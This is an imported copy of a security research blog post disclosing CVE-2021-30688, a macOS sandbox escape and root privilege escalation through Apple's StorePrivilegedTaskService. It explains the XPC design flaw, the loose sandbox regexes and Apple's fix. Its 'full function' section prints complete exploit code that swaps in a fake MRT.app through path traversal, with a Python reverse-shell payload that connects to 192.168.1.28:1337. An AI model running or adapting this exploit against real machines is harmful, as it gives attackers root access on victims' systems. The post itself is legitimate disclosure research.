---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-12-21_sandbox-escape-privilege-escalation-in-storeprivilegedtaskservice.md
original_filename: 2021-12-21_sandbox-escape-privilege-escalation-in-storeprivilegedtaskservice.md
title: Sandbox escape + privilege escalation in StorePrivilegedTaskService
category: documents
detected_topics:
- supply-chain
- access-control
- command-injection
- path-traversal
- automation-abuse
- api-security
tags:
- imported
- documents
- supply-chain
- access-control
- command-injection
- path-traversal
- automation-abuse
- api-security
language: en
raw_sha256: 40cfa838cb6043837f5afa666027accc8644ca87e7b1f79e9b1a95f42d6353ec
text_sha256: cfd33944170744add9d2221295d4d5cfe639dd41a985e8b8c011e10093dc54e9
ingested_at: '2026-06-28T07:32:09Z'
sensitivity: unknown
redactions_applied: false
---

# Sandbox escape + privilege escalation in StorePrivilegedTaskService

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-12-21_sandbox-escape-privilege-escalation-in-storeprivilegedtaskservice.md
- Source Type: markdown
- Detected Topics: supply-chain, access-control, command-injection, path-traversal, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:09Z
- Redactions Applied: False
- Raw SHA256: `40cfa838cb6043837f5afa666027accc8644ca87e7b1f79e9b1a95f42d6353ec`
- Text SHA256: `cfd33944170744add9d2221295d4d5cfe639dd41a985e8b8c011e10093dc54e9`


## Content

---
title: "Sandbox escape + privilege escalation in StorePrivilegedTaskService"
page_title: "Sandbox escape + privilege escalation in StorePrivilegedTaskService | DEFION Research Labs"
url: "https://sector7.computest.nl/post/2021-12-storeprivilegedtaskservice/"
final_url: "https://defion.security/en/research-labs/sandbox-escape-privilege-escalation-in-storeprivilegedtaskservice/"
authors: ["Sector 7 (@sector7_nl)"]
programs: ["Apple"]
bugs: ["Local Privilege Escalation", "MacOS"]
publication_date: "2021-12-21"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3069
---

[Home](/en/) › [Research Labs](/en/research-labs/) › Sandbox escape + privilege escalation in StorePrivilegedTaskService

macOS Security 21 December 2021 · 13 min read

# Sandbox escape + privilege escalation in StorePrivilegedTaskService

CVE-2021-30688 is a vulnerability which was fixed in macOS 11.4 that allowed a malicious application to escape the Mac Application Sandbox and to escalate its privileges to root. This vulnerability required a strange exploitation path due to the sandbox profile of the affected service.

## Background

At [rC3](https://media.ccc.de/v/rc3-10175-escape_the_macos_sandbox_and_tcc) in 2020 and [HITB Amsterdam](https://conference.hitb.org/hitbsecconf2021ams/sessions/macos-local-security-escaping-the-sandbox-and-bypassing-tcc/) 2021 Daan Keuper and Thijs Alkemade gave a talk on macOS local security. One of the subjects of this talk was the use of privileged helper tools and the vulnerabilities commonly found in them. To summarize, many applications install a privileged helper tool in order to install updates for the application. This allows normal (non-admin) users to install updates, which is normally not allowed due to the permissions on `/Applications`. A privileged helper tool is a service which runs as root which used for only a specific task that needs root privileges. In this case, this could be installing a package file.

Many applications that use such a tool contain two vulnerabilities that in combination lead to privilege escalation:

  1. Not verifying if a request to install a package comes from the main application.
  2. Not correctly verifying the authenticity of an update package.

As it turns out, the first issue not only affects third-party developers, but even Apple itself! Although in a slightly different way...

## About StorePrivilegedTaskService

`StorePrivilegedTaskService` is a tool used by the Mac App Store to perform certain privileged operations, such as removing the quarantine flag of downloaded files, moving files and adding App Store receipts. It is an XPC service embedded in the `AppStoreDaemon.framework` private framework.

To explain this vulnerability, it would be best to first explain XPC services and Mach services, and the difference between those two.

First of all, XPC is an inter-process communication technology developed by Apple which is used extensively to communicate between different processes in all of Apple's operating systems. In iOS, XPC is a private API, usable only indirectly by APIs that need to communicate with other processes. On macOS, developers can use it directly. One of the main benefits of XPC is that it sends structured data, supporting many data types such as integers, strings, dictionaries and arrays. This can in many cases avoid the use of serialization functions, which reduces the possibility of vulnerabilities due to parser bugs.

### XPC services

An **XPC service** is a lightweight process related to another application. These are launched automatically when an application initiates an XPC connection and terminated after they are no longer used. Communication with the main process happens (of course) over XPC. The main benefit of using XPC services is the ability to separate dangerous operations or privileges, because the XPC service can have different entitlements.

For example, suppose an application needs network functionality for only one feature: to download a fixed URL. This means that when sandboxing the application, it would need full network client access (i.e. the `com.apple.security.network.client` entitlement). A vulnerability in this application can then also use the network access to send out arbitrary network traffic. If the functionality for performing the request would be moved to a different XPC service, then only this service would need the network permission. Compromising the main application would only allow it to retrieve that URL and compromising the XPC service would be unlikely, as it requires very little code. This pattern is how Apple uses these services throughout the system.

These services can have one of 3 possible _service types_ :

  * **Application** : each application initiating a connection to an XPC service spawns a new process (though multiple connections from one application are still handled in the same process).
  * **User** : per user only one instance of an XPC service is running, handling requests from all applications running as that user.
  * **System** : only one instance of the XPC service is running and it runs as root. Only available for Apple's own XPC services.

### Mach services

While XPC services are local to an application, Mach services are accessible for XPC connections system wide by registering a name. A common way to register this name is through a launch agent or launch daemon config file. This can launch the process on demand, but the process is not terminated automatically when no longer in use, like XPC services are.

For example, some of the mach services of `lsd`:

_/System/Library/LaunchDaemons/com.apple.lsd.plist_ :
  
  
  <key>MachServices</key>
  <dict>
  <key>com.apple.lsd.advertisingidentifiers</key>
  <true/>
  <key>com.apple.lsd.diagnostics</key>
  <true/>
  <key>com.apple.lsd.dissemination</key>
  <true/>
  <key>com.apple.lsd.mapdb</key>
  <true/>
  ...

Connecting to an XPC service using the `NSXPCConnection` API:
  
  
  [[NSXPCConnection alloc] initWithServiceName:serviceName];

while connecting to a mach service:
  
  
  [[NSXPCConnection alloc] initWithMachServiceName:name options:options];

`NSXPCConnection` is a higher-level Objective-C API for XPC connections. When using it, an object with a list of methods can be made available to the other end of the connection. The connecting client can call these methods just like it would call any normal Objective-C methods. All serialization of objects as arguments is handled automatically.

## Permissions

XPC services in third-party applications rarely have interesting permissions to steal compared to a non-sandboxed application. Sanboxed services can have entitlements that create sandbox exceptions, for example to allow the service to access the network. Compared to a non-sandboxed application, these entitlements are not interesting to steal because the app is not sandboxed. TCC permissions are also usually set for the main application, not its XPC services (as that would generate rather confusing prompts for the end user).

A non-sandboxed application can therefore almost never gain anything by connecting to the XPC service of another application. The template for creating a new XPC service in Xcode does not even include a check on which application has connected!

This does, however, appear to give developers a false sense of security because they often do not add a permission check to Mach services either. This leads to the privileged helper tool vulnerabilities discussed in our talk. For Mach services running as root, a check on which application has connected is very important. Otherwise, any application could connect to the Mach service to request it to perform its operations.

## StorePrivilegedTaskService vulnerability

### Sandbox escape

The main vulnerability in the `StorePrivilegedTaskService` XPC service was that it did not check the application initiating the connection. This service has a service type of **System** , so it would launch as root.

This vulnerability was exploitable due to defense-in-depth measures which were ineffective:

  * `StorePrivilegedTaskService` is sandboxed, but its custom sandboxing profile is not restrictive enough.
  * For some operations, the service checked the paths passed as arguments to ensure they are a subdirectory of a specific directory. These checks could be bypassed using path traversal.

This XPC service is embedded in a framework. This means that even a sandboxed application could connect to the XPC service, by loading the framework and then connecting to the service.
  
  
  [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AppStoreDaemon.framework/"] load];
  
  NSXPCConnection *conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.AppStoreDaemon.StorePrivilegedTaskService"];

The XPC service offers a number of interesting methods that can be called from the application using an `NSXPCConnection`. For example:
  
  
  // Write a file
  - (void)writeAssetPackMetadata:(NSData *)metadata toURL:(NSURL *)url withReplyHandler:(void (^)(NSError *))replyHandler;
  // Delete an item
  - (void)removePlaceholderAtPath:(NSString *)path withReplyHandler:(void (^)(NSError *))replyHandler;
  // Change extended attributes for a path
  - (void)setExtendedAttributeAtPath:(NSString *)path name:(NSString *)name value:(NSData *)value withReplyHandler:(void (^)(NSError *))replyHandler;
  // Move an item
  - (void)moveAssetPackAtPath:(NSString *)path toPath:(NSString *)toPath withReplyHandler:(void (^)(NSError *))replyHandler;

A sandbox escape was quite clear: write a new application bundle, use the method `-setExtendedAttributeAtPath:name:value:withReplyHandler:` to remove its quarantine flag and then launch it. However, this also needs to take into account the sandbox profile of the XPC service.

The service has a custom profile. The restriction related to files and folders are:
  
  
  (allow file-read* file-write*
  (require-all
  (vnode-type DIRECTORY)
  (require-any
  (literal "/Library/Application Support/App Store")
  (regex #"\.app(download)?(/Contents)?")
  (regex #"\.app(download)?/Contents/_MASReceipt(\.sb-[a-zA-Z0-9-]+)?")))
  (require-all
  (vnode-type REGULAR-FILE)
  (require-any
  (literal "/Library/Application Support/App Store/adoption.plist")
  (literal "/Library/Preferences/com.apple.commerce.plist")
  (regex #"\.appdownload/Contents/placeholderinfo")
  (regex #"\.appdownload/Icon")
  (regex #"\.app(download)?/Contents/_MASReceipt((\.sb-[a-zA-Z0-9-]+)?/receipt(\.saved)?)"))) ;covers temporary files the receipt may be named
  
  (subpath "/System/Library/Caches/com.apple.appstored")
  (subpath "/System/Library/Caches/OnDemandResources")
  )

The intent of these rules is that this service can modify specific files in applications currently downloading from the app store, so with a `.appdownload` extension. For example, adding a `MASReceipt` file and changing the icon.

The regexes here are the most interesting, mainly because they are attached neither on the left nor right. On the left this makes sense, as the full path could be unknown, but the lack of binding it on the right (with `$`) is a mistake for the file regexes.

Formulated simply, we can do the following with this sandboxing profile:

  * All operations are allowed on directories containing `.app` anywhere in their path.
  * All operations are allowed on files containing `.appdownload/Icon` anywhere in their path.

By creating a specific directory structure in the temporary files directory of our sandboxed application:
  
  
  bar.appdownload/Icon/

Both the sandboxed application and the StorePrivilegedTaskService have full access inside the `Icon` folder. Therefore, it would be possible to create a new application here and then use `-setExtendedAttributeAtPath:name:value:withReplyHandler:` on the executable to dequarantine it.

### Privesc

This was already a nice vulnerability, but we were convinced we could escalate privileges to root as well. Having a process running as root creating new files in chosen directories with specific contents is such a powerful primitive that privilege escalation should be possible. However, the sandbox requirements on the paths made this difficult.

Creating a new launch daemon or cron jobs are common ways for privilege escalation by file creation, but the sandbox profile path requirements would only allow a subdirectory of a subdirectory of the directories for these config files, so this did not work.

An option that would work would be to modify an application. In particular, we found that Microsoft Teams would work. Teams is one of the applications that installs a launch daemon for installing updates. However, instead of copying a binary to `/Library/PrivilegedHelperTools`, the daemon points into the application bundle itself:

_/Library/LaunchDaemons/com.microsoft.teams.TeamsUpdaterDaemon.plist_
  
  
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
  <plist version="1.0">
  <dict>
  <key>Label</key>
  <string>com.microsoft.teams.TeamsUpdaterDaemon</string>
  <key>MachServices</key>
  <dict>
  <key>com.microsoft.teams.TeamsUpdaterDaemon</key>
  <true/>
  </dict>
  <key>Program</key>
  <string>/Applications/Microsoft Teams.app/Contents/TeamsUpdaterDaemon.xpc/Contents/MacOS/TeamsUpdaterDaemon</string>
  </dict>
  </plist>

The following would work for privilege escalation:

  1. Ask `StorePrivilegedTaskService` to move `/Applications/Microsoft Teams.app` somewhere else. Allowed, because the path of the directory contains `.app`.[^1]
  2. Move a new app bundle to `/Applications/Microsoft Teams.app`, which contains a malicious executable file at `Contents/TeamsUpdaterDaemon.xpc/Contents/MacOS/TeamsUpdaterDaemon`.
  3. Connect to the `com.microsoft.teams.TeamsUpdaterDaemon` Mach service.

However, a privilege escalation requiring a specific third-party application to be installed is not as convincing as a privilege escalation without this requirement, so we kept looking. The requirements are somewhat contradictory: typically anything bundled into an `.app` bundle runs as a normal user, not as root. In addition, the Signed System Volume on macOS Big Sur means changing any of the built-in applications is also impossible.

By an impressive and ironic coincidence, there is an application which is installed on a new macOS installation, not on the SSV and which runs automatically as root: `MRT.app`, the "Malware Removal Tool". Apple has implemented a number of anti-malware mechanisms in macOS. These are all updateable without performing a full system upgrade because they might be needed quickly. This means in particular that `MRT.app` is not on the SSV. Most malware is removed by signature or hash checks for malicious content, MRT is the more heavy-handed solution when Apple needs to add code for performing the removal.

Although `MRT.app` is in an app bundle, it is not in fact a real application. At boot, MRT is run as root to check if any malware needs removing.

Our complete attack follows the following steps, from sandboxed application to code execution as root:

  1. Create a new application bundle `bar.appdownload/Icon/foo.app` in the temporary directory of our sandboxed application containing a malicious executable.
  2. Load the `AppStoreDaemon.framework` framework and connect to the `StorePrivilegedTaskService` XPC service.
  3. Ask `StorePrivilegedTaskService` to change the quarantine attribute for the executable file to allow it to launch without a prompt.
  4. Ask `StorePrivilegedTaskService` to move `/Library/Apple/System/Library/CoreServices/MRT.app` to a different location.
  5. Ask `StorePrivilegedTaskService` to move `bar.appdownload/Icon/foo.app` from the temporary directory to `/Library/Apple/System/Library/CoreServices/MRT.app`.
  6. Wait for a reboot.

See the full function here:
  
  
  /// The bar.appdownload/Icon part in the path is needed to create files where both the sandbox profile of StorePrivilegedTaskService and the Mac AppStore sandbox of this process allow acccess.
  NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"bar.appdownload/Icon/foo.app"];
  NSFileManager *fm = [NSFileManager defaultManager];
  NSError *error = nil;
  
  /// Cleanup, if needed.
  [fm removeItemAtPath:path error:nil];
  
  [fm createDirectoryAtPath:[path stringByAppendingPathComponent:@"Contents/MacOS"] withIntermediateDirectories:TRUE attributes:nil error:&error];
  
  assert(!error);
  
  /// Create the payload. This example uses a Python reverse shell to 192.168.1.28:1337.
  [@"#!/usr/bin/env python\n\nimport socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"192.168.1.28\",1337)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);" writeToFile:[path stringByAppendingPathComponent:@"Contents/MacOS/MRT"] atomically:TRUE encoding:NSUTF8StringEncoding error:&error];
  
  assert(!error);
  
  /// Make the payload executable
  [fm setAttributes:@{NSFilePosixPermissions: [NSNumber numberWithShort:0777]} ofItemAtPath:[path stringByAppendingPathComponent:@"Contents/MacOS/MRT"] error:&error];
  
  assert(!error);
  
  /// Load the framework, so the XPC service can be resolved.
  [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AppStoreDaemon.framework/"] load];
  
  NSXPCConnection *conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.AppStoreDaemon.StorePrivilegedTaskService"];
  conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(StorePrivilegedTaskInterface)];
  [conn resume];
  
  /// The new file is now quarantined, because this process created it. Change the quarantine flag to something which is allowed to run.
  /// Another option would have been to use the `-writeAssetPackMetadata:toURL:replyHandler` method to create an unquarantined file.
  [conn.remoteObjectProxy setExtendedAttributeAtPath:[path stringByAppendingPathComponent:@"Contents/MacOS/MRT"] name:@"com.apple.quarantine" value:[@"00C3;60018532;Safari;" dataUsingEncoding:NSUTF8StringEncoding] withReplyHandler:^(NSError *result) {
  NSLog(@"%@", result);
  
  assert(result == nil);
  
  srand((unsigned int)time(NULL));
  
  /// Deleting this directory is not allowed by the sandbox profile of StorePrivilegedTaskService: it can't modify the files inside it.
  /// However, to move a directory, the permissions on the contents do not matter.
  /// It is moved to a randomly named directory, because the service refuses if it already exists.
  [conn.remoteObjectProxy moveAssetPackAtPath:@"/Library/Apple/System/Library/CoreServices/MRT.app/" toPath:[NSString stringWithFormat:@"/System/Library/Caches/OnDemandResources/AssetPacks/../../../../../../../../../../../Library/Apple/System/Library/CoreServices/MRT%d.app/", rand()]
  withReplyHandler:^(NSError *result) {
  NSLog(@"Result: %@", result);
  
  assert(result == nil);
  
  /// Move the malicious directory in place of MRT.app.
  [conn.remoteObjectProxy moveAssetPackAtPath:path toPath:@"/System/Library/Caches/OnDemandResources/AssetPacks/../../../../../../../../../../../Library/Apple/System/Library/CoreServices/MRT.app/" withReplyHandler:^(NSError *result) {
  NSLog(@"Result: %@", result);
  
  /// At launch, /Library/Apple/System/Library/CoreServices/MRT.app/Contents/MacOS/MRT -d is started. So now time to wait for that...
  }];
  }];
  }];

## Fix

Apple has pushed out a fix in the macOS 11.4 release. They implemented all 3 of the recommended changes:

  1. Check the entitlements of the process initiating the connection to `StorePrivilegedTaskService`.
  2. Tightened the sandboxing profile of `StorePrivilegedTaskService`.
  3. The path traversal vulnerabilities for the subdirectory check were fixed.

This means that the vulnerability is not just fixed, but reintroducing it later is unlikely to be exploitable again due to the improved sandboxing profile and path checks. We reported this vulnerability to Apple on January 19th, 2021 and a fix was released on May 24th, 2021.

[^1]: This is actually a quite interesting aspect of the macOS sandbox: to delete a directory, the process needs to have `file-write-unlink` permission on all of the contents, as each file in it must be deleted. To move a directory somewhere else, only permissions on the directory itself and its destination are needed!

From our research desk to your environment

The offensive expertise behind this research is the same expertise that tests your own systems. Find the vulnerabilities that matter before attackers do. 

[Pentesting Services →](/en/pentesting-services/)

[← Back to Research Labs](/en/research-labs/)
